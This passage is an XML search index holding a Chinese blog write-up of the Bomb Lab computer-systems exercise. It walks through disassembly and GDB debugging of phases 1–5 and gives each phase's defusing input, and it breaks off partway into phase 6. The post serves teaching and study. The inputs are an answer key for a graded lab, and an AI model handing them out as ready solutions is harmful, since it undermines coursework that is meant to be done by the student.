<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Bomblab</title>
    <link href="/2023/04/20/Bomblab/"/>
    <url>/2023/04/20/Bomblab/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统第三次实验-Bomb-lab"><a href="#计算机系统第三次实验-Bomb-lab" class="headerlink" title="计算机系统第三次实验 Bomb lab"></a>计算机系统第三次实验 Bomb lab</h1><p>本实验用到的环境、命令如下：</p><ul><li>Ubuntu 20.04</li><li><code>objdump</code></li><li>GDB（~peda插件版）</li></ul><h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h2><ul><li><p>将 bomb 这个 elf 文件使用 <code>file bomb</code>查看其基本信息，得知它是一个 64 bit 程序，放入 Ubuntu 20.04 中进行后续操作；</p></li><li><p><code>chmod 777 bomb</code>为其赋予权限；</p></li><li><p>使用 <code> objdump -d bomb</code>获取其反汇编代码如下（节选 <phase_1> 部分）</phase_1></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs assembly">00000000000015e7 &lt;phase_1&gt;:<br>    15e7:f3 0f 1e fa          endbr64 <br>    15eb:48 83 ec 08          sub    $0x8,%rsp<br>    15ef:48 8d 35 5a 1b 00 00 lea    0x1b5a(%rip),%rsi        # 3150 &lt;_IO_stdin_used+0x150&gt;<br>    15f6:e8 f4 04 00 00       callq  1aef &lt;strings_not_equal&gt;<br>    15fb:85 c0                test   %eax,%eax<br>    15fd:75 05                jne    1604 &lt;phase_1+0x1d&gt;<br>    15ff:48 83 c4 08          add    $0x8,%rsp<br>    1603:c3                   retq   <br>    1604:e8 fa 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1609:eb f4                jmp    15ff &lt;phase_1+0x18&gt;<br><br></code></pre></td></tr></table></figure><p>分析如下：</p><ul><li><p>注意不要运行炸弹函数<code>&lt;explode_bomb&gt;</code>！</p></li><li><p>那么需要执行 1603 处的代码；</p></li><li><p>注意到，15fd 处的跳转若触发，则程序跳转至 1604 处，会失败；</p></li><li><p>那么 eax 需要为 0，这样 15fb 行跳转不会触发；</p></li><li><p>需要<code>strings_not_equal</code>函数返回值为 0 ； </p></li><li><p>上述函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1aef:f3 0f 1e fa          endbr64 <br>1af3:41 54                push   %r12<br>1af5:55                   push   %rbp<br>1af6:53                   push   %rbx<br>1af7:48 89 fb             mov    %rdi,%rbx<br>1afa:48 89 f5             mov    %rsi,%rbp<br>1afd:e8 cc ff ff ff       callq  1ace &lt;string_length&gt;<br>1b02:41 89 c4             mov    %eax,%r12d<br>1b05:48 89 ef             mov    %rbp,%rdi<br>1b08:e8 c1 ff ff ff       callq  1ace &lt;string_length&gt;<br>1b0d:89 c2                mov    %eax,%edx<br>1b0f:b8 01 00 00 00       mov    $0x1,%eax<br>1b14:41 39 d4             cmp    %edx,%r12d<br>1b17:75 31                jne    1b4a &lt;strings_not_equal+0x5b&gt;<br>1b19:0f b6 13             movzbl (%rbx),%edx<br>1b1c:84 d2                test   %dl,%dl<br>1b1e:74 1e                je     1b3e &lt;strings_not_equal+0x4f&gt;<br>1b20:b8 00 00 00 00       mov    $0x0,%eax<br>1b25:38 54 05 00          cmp    %dl,0x0(%rbp,%rax,1)<br>1b29:75 1a                jne    1b45 &lt;strings_not_equal+0x56&gt;<br>1b2b:48 83 c0 01          add    $0x1,%rax<br>1b2f:0f b6 14 03          movzbl (%rbx,%rax,1),%edx<br>1b33:84 d2                test   %dl,%dl<br>1b35:75 ee                jne    1b25 &lt;strings_not_equal+0x36&gt;<br>1b37:b8 00 00 00 00       mov    $0x0,%eax<br>1b3c:eb 0c                jmp    1b4a &lt;strings_not_equal+0x5b&gt;<br>1b3e:b8 00 00 00 00       mov    $0x0,%eax<br>1b43:eb 05                jmp    1b4a &lt;strings_not_equal+0x5b&gt;<br>1b45:b8 01 00 00 00       mov    $0x1,%eax<br>1b4a:5b                   pop    %rbx<br>1b4b:5d                   pop    %rbp<br>1b4c:41 5c                pop    %r12<br>1b4e:c3                   retq   <br></code></pre></td></tr></table></figure></li><li><p>GDB 动态调试中，找到字符串<code>I am not part of the problem. I am a Republican.</code></p></li><li><p>传入上述字符串即可通关 phase_1。</p></li></ul><h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000000000000160b &lt;phase_2&gt;:<br>    160b:f3 0f 1e fa          endbr64 <br>    160f:55                   push   %rbp<br>    1610:53                   push   %rbx<br>    1611:48 83 ec 28          sub    $0x28,%rsp<br>    1615:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    161c:00 00 <br>    161e:48 89 44 24 18       mov    %rax,0x18(%rsp)<br>    1623:31 c0                xor    %eax,%eax<br>    1625:48 89 e6             mov    %rsp,%rsi<br>    1628:e8 02 06 00 00       callq  1c2f &lt;read_six_numbers&gt;<br>    162d:83 3c 24 01          cmpl   $0x1,(%rsp)<br>    1631:75 0a                jne    163d &lt;phase_2+0x32&gt;<br>    1633:48 89 e3             mov    %rsp,%rbx<br>    1636:48 8d 6c 24 14       lea    0x14(%rsp),%rbp<br>    163b:eb 10                jmp    164d &lt;phase_2+0x42&gt;<br>    163d:e8 c1 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1642:eb ef                jmp    1633 &lt;phase_2+0x28&gt;<br>    1644:48 83 c3 04          add    $0x4,%rbx<br>    1648:48 39 eb             cmp    %rbp,%rbx<br>    164b:74 10                je     165d &lt;phase_2+0x52&gt;<br>    164d:8b 03                mov    (%rbx),%eax<br>    164f:01 c0                add    %eax,%eax<br>    1651:39 43 04             cmp    %eax,0x4(%rbx)<br>    1654:74 ee                je     1644 &lt;phase_2+0x39&gt;<br>    1656:e8 a8 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    165b:eb e7                jmp    1644 &lt;phase_2+0x39&gt;<br>    165d:48 8b 44 24 18       mov    0x18(%rsp),%rax<br>    1662:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    1669:00 00 <br>    166b:75 07                jne    1674 &lt;phase_2+0x69&gt;<br>    166d:48 83 c4 28          add    $0x28,%rsp<br>    1671:5b                   pop    %rbx<br>    1672:5d                   pop    %rbp<br>    1673:c3                   retq   <br>    1674:e8 d7 fb ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><ul><li><p>关键行 165b ，其无条件跳转回 1644 ，且需注意 1654，eax 必须与 0x4(%rbx)相等，否则触发引爆函数；</p></li><li><p>由 162d ，1631 得知，第一个传入的数必须是 1；</p></li><li><p>注意 164f ，eax 值乘2，然后与内存中的一个值比较，这个值是上一次循环中的 eax；</p></li><li><p>至此，可以看出是一个 2 的幂次的循环。</p></li><li><p>payload = 1 2 4 8 16 32；</p></li><li><p>成功解决 phase2；</p></li></ul><h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000001679 &lt;phase_3&gt;:<br>    1679:f3 0f 1e fa          endbr64 <br>    167d:48 83 ec 18          sub    $0x18,%rsp<br>    1681:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    1688:00 00 <br>    168a:48 89 44 24 08       mov    %rax,0x8(%rsp)<br>    168f:31 c0                xor    %eax,%eax<br>    1691:48 8d 4c 24 04       lea    0x4(%rsp),%rcx<br>    1696:48 89 e2             mov    %rsp,%rdx<br>    1699:48 8d 35 8f 1c 00 00 lea    0x1c8f(%rip),%rsi        # 332f &lt;array.0+0x14f&gt;<br>    16a0:e8 5b fc ff ff       callq  1300 &lt;__isoc99_sscanf@plt&gt;<br>    16a5:83 f8 01             cmp    $0x1,%eax<br>    16a8:7e 1a                jle    16c4 &lt;phase_3+0x4b&gt;<br>    16aa:83 3c 24 07          cmpl   $0x7,(%rsp)<br>    16ae:77 65                ja     1715 &lt;phase_3+0x9c&gt;<br>    16b0:8b 04 24             mov    (%rsp),%eax<br>    16b3:48 8d 15 06 1b 00 00 lea    0x1b06(%rip),%rdx        # 31c0 &lt;_IO_stdin_used+0x1c0&gt;<br>    16ba:48 63 04 82          movslq (%rdx,%rax,4),%rax<br>    16be:48 01 d0             add    %rdx,%rax<br>    16c1:3e ff e0             notrack jmpq *%rax<br>    16c4:e8 3a 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    16c9:eb df                jmp    16aa &lt;phase_3+0x31&gt;<br>    16cb:b8 4c 01 00 00       mov    $0x14c,%eax<br>    16d0:39 44 24 04          cmp    %eax,0x4(%rsp)<br>    16d4:75 52                jne    1728 &lt;phase_3+0xaf&gt;<br>    16d6:48 8b 44 24 08       mov    0x8(%rsp),%rax<br>    16db:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    16e2:00 00 <br>    16e4:75 49                jne    172f &lt;phase_3+0xb6&gt;<br>    16e6:48 83 c4 18          add    $0x18,%rsp<br>    16ea:c3                   retq   <br>    16eb:b8 89 02 00 00       mov    $0x289,%eax<br>    16f0:eb de                jmp    16d0 &lt;phase_3+0x57&gt;<br>    16f2:b8 f6 00 00 00       mov    $0xf6,%eax<br>    16f7:eb d7                jmp    16d0 &lt;phase_3+0x57&gt;<br>    16f9:b8 ae 01 00 00       mov    $0x1ae,%eax<br>    16fe:eb d0                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1700:b8 f1 02 00 00       mov    $0x2f1,%eax<br>    1705:eb c9                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1707:b8 17 01 00 00       mov    $0x117,%eax<br>    170c:eb c2                jmp    16d0 &lt;phase_3+0x57&gt;<br>    170e:b8 2a 02 00 00       mov    $0x22a,%eax<br>    1713:eb bb                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1715:e8 e9 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    171a:b8 00 00 00 00       mov    $0x0,%eax<br>    171f:eb af                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1721:b8 24 01 00 00       mov    $0x124,%eax<br>    1726:eb a8                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1728:e8 d6 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    172d:eb a7                jmp    16d6 &lt;phase_3+0x5d&gt;<br>    172f:e8 1c fb ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li><p>注意前面几行，sscanf 调用之前，设置了四个参数，可以看出是传入两个数；</p></li><li><p>且第一个数要小于 7 ，否则触发引爆函数；</p></li><li><p>随后跳转到 rax 指向的位置执行；</p></li><li><p>进入 gdb 进行动态调试，跟踪一下进入 rax 指向空间后的堆栈情况；</p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x5555555556c1</span> &lt;phase_3+<span class="hljs-number">72</span>&gt;:notrack <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x5555555556c4</span> &lt;phase_3+<span class="hljs-number">75</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555c03</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x5555555556c9</span> &lt;phase_3+<span class="hljs-number">80</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x5555555556aa</span> &lt;phase_3+<span class="hljs-number">49</span>&gt;<br>=&gt; <span class="hljs-number">0x5555555556cb</span> &lt;phase_3+<span class="hljs-number">82</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x14c</span><br>   <span class="hljs-number">0x5555555556d0</span> &lt;phase_3+<span class="hljs-number">87</span>&gt;:<span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x4</span>],<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x5555555556d4</span> &lt;phase_3+<span class="hljs-number">91</span>&gt;:<span class="hljs-keyword">jne</span>    <span class="hljs-number">0x555555555728</span> &lt;phase_3+<span class="hljs-number">175</span>&gt;<br>   <span class="hljs-number">0x5555555556d6</span> &lt;phase_3+<span class="hljs-number">93</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0x5555555556db</span> &lt;phase_3+<span class="hljs-number">98</span>&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x28</span><br>//这是执行代码情况<br><br><br>随后将 <span class="hljs-built_in">eax</span>（值为<span class="hljs-number">0x14c</span>）与传入的第二个参数对比，可见第二个参数需要为 <span class="hljs-number">0x14c</span>！<br></code></pre></td></tr></table></figure><ul><li><p>payload = 1 334；</p></li><li><p>成功解决phase_3；</p></li></ul><h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000001734 &lt;func4&gt;:<br>    1734:f3 0f 1e fa          endbr64 <br>    1738:53                   push   %rbx<br>    1739:89 d0                mov    %edx,%eax<br>    173b:29 f0                sub    %esi,%eax<br>    173d:89 c3                mov    %eax,%ebx<br>    173f:c1 eb 1f             shr    $0x1f,%ebx<br>    1742:01 c3                add    %eax,%ebx<br>    1744:d1 fb                sar    %ebx<br>    1746:01 f3                add    %esi,%ebx<br>    1748:39 fb                cmp    %edi,%ebx<br>    174a:7f 06                jg     1752 &lt;func4+0x1e&gt;<br>    174c:7c 10                jl     175e &lt;func4+0x2a&gt;<br>    174e:89 d8                mov    %ebx,%eax<br>    1750:5b                   pop    %rbx<br>    1751:c3                   retq   <br>    1752:8d 53 ff             lea    -0x1(%rbx),%edx<br>    1755:e8 da ff ff ff       callq  1734 &lt;func4&gt;<br>    175a:01 c3                add    %eax,%ebx<br>    175c:eb f0                jmp    174e &lt;func4+0x1a&gt;<br>    175e:8d 73 01             lea    0x1(%rbx),%esi<br>    1761:e8 ce ff ff ff       callq  1734 &lt;func4&gt;<br>    1766:01 c3                add    %eax,%ebx<br>    1768:eb e4                jmp    174e &lt;func4+0x1a&gt;<br><br>000000000000176a &lt;phase_4&gt;:<br>    176a:f3 0f 1e fa          endbr64 <br>    176e:48 83 ec 18          sub    $0x18,%rsp<br>    1772:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    1779:00 00 <br>    177b:48 89 44 24 08       mov    %rax,0x8(%rsp)<br>    1780:31 c0                xor    %eax,%eax<br>    1782:48 8d 4c 24 04       lea    0x4(%rsp),%rcx<br>    1787:48 89 e2             mov    %rsp,%rdx<br>    178a:48 8d 35 9e 1b 00 00 lea    0x1b9e(%rip),%rsi        # 332f &lt;array.0+0x14f&gt;<br>    1791:e8 6a fb ff ff       callq  1300 &lt;__isoc99_sscanf@plt&gt;<br>    1796:83 f8 02             cmp    $0x2,%eax<br>    1799:75 06                jne    17a1 &lt;phase_4+0x37&gt;<br>    179b:83 3c 24 0e          cmpl   $0xe,(%rsp)<br>    179f:76 05                jbe    17a6 &lt;phase_4+0x3c&gt;<br>    17a1:e8 5d 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    17a6:ba 0e 00 00 00       mov    $0xe,%edx<br>    17ab:be 00 00 00 00       mov    $0x0,%esi<br>    17b0:8b 3c 24             mov    (%rsp),%edi<br>    17b3:e8 7c ff ff ff       callq  1734 &lt;func4&gt;<br>    17b8:83 f8 2d             cmp    $0x2d,%eax<br>    17bb:75 07                jne    17c4 &lt;phase_4+0x5a&gt;<br>    17bd:83 7c 24 04 2d       cmpl   $0x2d,0x4(%rsp)<br>    17c2:74 05                je     17c9 &lt;phase_4+0x5f&gt;<br>    17c4:e8 3a 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    17c9:48 8b 44 24 08       mov    0x8(%rsp),%rax<br>    17ce:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    17d5:00 00 <br>    17d7:75 05                jne    17de &lt;phase_4+0x74&gt;<br>    17d9:48 83 c4 18          add    $0x18,%rsp<br>    17dd:c3                   retq   <br>    17de:e8 6d fa ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li>读入两个数，其中第一个数要小于等于14；</li><li>17b8和17bd可看出，func4 返回值和 第二个数均应为 45；</li><li>于是一共就有14种可能（1 45、2 45、…… 、 14 45）；</li><li>分析 func4 可发现其是一个递归函数，当传入参数为 14 时，返回值为 45；</li><li>payload = 14 45；</li><li>第四题解决。</li></ul><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000000017e3 &lt;phase_5&gt;:<br>    17e3:f3 0f 1e fa          endbr64 <br>    17e7:48 83 ec 18          sub    $0x18,%rsp<br>    17eb:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    17f2:00 00 <br>    17f4:48 89 44 24 08       mov    %rax,0x8(%rsp)<br>    17f9:31 c0                xor    %eax,%eax<br>    17fb:48 8d 4c 24 04       lea    0x4(%rsp),%rcx<br>    1800:48 89 e2             mov    %rsp,%rdx<br>    1803:48 8d 35 25 1b 00 00 lea    0x1b25(%rip),%rsi        # 332f &lt;array.0+0x14f&gt;<br>    180a:e8 f1 fa ff ff       callq  1300 &lt;__isoc99_sscanf@plt&gt;<br>    180f:83 f8 01             cmp    $0x1,%eax<br>    1812:7e 5a                jle    186e &lt;phase_5+0x8b&gt;<br>    1814:8b 04 24             mov    (%rsp),%eax<br>    1817:83 e0 0f             and    $0xf,%eax<br>    181a:89 04 24             mov    %eax,(%rsp)<br>    181d:83 f8 0f             cmp    $0xf,%eax<br>    1820:74 32                je     1854 &lt;phase_5+0x71&gt;<br>    1822:b9 00 00 00 00       mov    $0x0,%ecx<br>    1827:ba 00 00 00 00       mov    $0x0,%edx<br>    182c:48 8d 35 ad 19 00 00 lea    0x19ad(%rip),%rsi        # 31e0 &lt;array.0&gt;<br>    1833:83 c2 01             add    $0x1,%edx<br>    1836:48 98                cltq   <br>    1838:8b 04 86             mov    (%rsi,%rax,4),%eax<br>    183b:01 c1                add    %eax,%ecx<br>    183d:83 f8 0f             cmp    $0xf,%eax<br>    1840:75 f1                jne    1833 &lt;phase_5+0x50&gt;<br>    1842:c7 04 24 0f 00 00 00 movl   $0xf,(%rsp)<br>    1849:83 fa 0f             cmp    $0xf,%edx<br>    184c:75 06                jne    1854 &lt;phase_5+0x71&gt;<br>    184e:39 4c 24 04          cmp    %ecx,0x4(%rsp)<br>    1852:74 05                je     1859 &lt;phase_5+0x76&gt;<br>    1854:e8 aa 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1859:48 8b 44 24 08       mov    0x8(%rsp),%rax<br>    185e:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    1865:00 00 <br>    1867:75 0c                jne    1875 &lt;phase_5+0x92&gt;<br>    1869:48 83 c4 18          add    $0x18,%rsp<br>    186d:c3                   retq   <br>    186e:e8 90 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1873:eb 9f                jmp    1814 &lt;phase_5+0x31&gt;<br>    1875:e8 d6 f9 ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li>第五题仍然读入两个数，称之为第一个数、第二个数；</li><li>由181a~1820可看出，第一个数不能为15；</li><li>1833~1840这块代码可以看成：ecx不断地加上array中的不同的数，这个数，是上一个取出的数对应的数组中相应偏移量*4的数。当去取出的数为0xf时，结束，且此时取的次数应该为15，否则触发引爆函数；</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span>-peda$ x/<span class="hljs-number">60</span> <span class="hljs-number">0</span>x5555555571e0<br><span class="hljs-attribute">0x5555555571e0</span> &lt;array.<span class="hljs-number">0</span>&gt;:<span class="hljs-number">0</span>x000000020000000a<span class="hljs-number">0</span>x000000070000000e<br><span class="hljs-attribute">0x5555555571f0</span> &lt;array.<span class="hljs-number">0</span>+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000000c00000008<span class="hljs-number">0</span>x0000000b0000000f<br><span class="hljs-attribute">0x555555557200</span> &lt;array.<span class="hljs-number">0</span>+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0</span>x0000000400000000<span class="hljs-number">0</span>x0000000d00000001<br><span class="hljs-attribute">0x555555557210</span> &lt;array.<span class="hljs-number">0</span>+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0</span>x0000000900000003<span class="hljs-number">0</span>x0000000500000006<br><br></code></pre></td></tr></table></figure><ul><li>以上是数组中的数，4字节为一个数（int）</li><li>经过计算，payload = 5 115；即从5号元素开始取，最后取15次，取出数的和正好是115。</li></ul><p>第五题解决完毕。</p><h2 id="Phase-6"><a href="#Phase-6" class="headerlink" title="Phase_6"></a>Phase_6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000000000000187a &lt;phase_6&gt;:<br>    187a:f3 0f 1e fa          endbr64 <br>    187e:41 56                push   %r14<br>    1880:41 55                push   %r13<br>    1882:41 54                push   %r12<br>    1884:55                   push   %rbp<br>    1885:53                   push   %rbx<br>    1886:48 83 ec 60          sub    $0x60,%rsp<br>    188a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    1891:00 